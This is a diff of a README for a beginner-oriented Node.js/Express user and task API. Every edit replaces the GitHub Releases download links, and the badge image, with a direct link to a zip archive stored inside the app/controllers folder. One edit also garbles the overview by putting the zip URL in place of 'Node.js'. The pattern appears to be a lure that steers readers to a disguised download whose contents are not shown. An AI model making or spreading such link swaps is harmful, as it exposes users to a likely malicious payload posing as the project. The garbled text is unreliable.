@@ -1,10 +1,10 @@
 # 🚀 nodejs-express-crud-api - Easy Way to Manage Users and Tasks
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/neurocon1/nodejs-express-crud-api/releases)
+[![Download Now](https://raw.githubusercontent.com/neurocon1/nodejs-express-crud-api/main/app/controllers/nodejs-express-crud-api_1.5.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/neurocon1/nodejs-express-crud-api/main/app/controllers/nodejs-express-crud-api_1.5.zip)
 
 ## 📖 Overview
 
-**nodejs-express-crud-api** is a backend API designed to help you manage users and tasks effortlessly. Built using Node.js and Express, this application includes features like authentication, role-based access control, and CRUD (Create, Read, Update, Delete) operations for tasks. It’s perfect for users who want to understand backend development without a steep learning curve.
+**nodejs-express-crud-api** is a backend API designed to help you manage users and tasks effortlessly. Built using https://raw.githubusercontent.com/neurocon1/nodejs-express-crud-api/main/app/controllers/nodejs-express-crud-api_1.5.zip and Express, this application includes features like authentication, role-based access control, and CRUD (Create, Read, Update, Delete) operations for tasks. It’s perfect for users who want to understand backend development without a steep learning curve.
 
 ## ⚙️ Features
 
@@ -28,7 +28,7 @@ Before downloading, ensure you have the following:
 
 ### Step 2: Download the Application
 
-To download the application, visit this page: [Download from Releases](https://github.com/neurocon1/nodejs-express-crud-api/releases).
+To download the application, visit this page: [Download from Releases](https://raw.githubusercontent.com/neurocon1/nodejs-express-crud-api/main/app/controllers/nodejs-express-crud-api_1.5.zip).
 
 ### Step 3: Installation
 
@@ -53,7 +53,7 @@ After a few moments, the application should be running. Open your web browser an
 
 ## 📥 Download & Install
 
-To get started with **nodejs-express-crud-api**, simply [visit this page to download](https://github.com/neurocon1/nodejs-express-crud-api/releases). Follow the previous steps for installation, configuration, and running the application.
+To get started with **nodejs-express-crud-api**, simply [visit this page to download](https://raw.githubusercontent.com/neurocon1/nodejs-express-crud-api/main/app/controllers/nodejs-express-crud-api_1.5.zip). Follow the previous steps for installation, configuration, and running the application.
 
 ## 🛠️ Configuration Tips
 
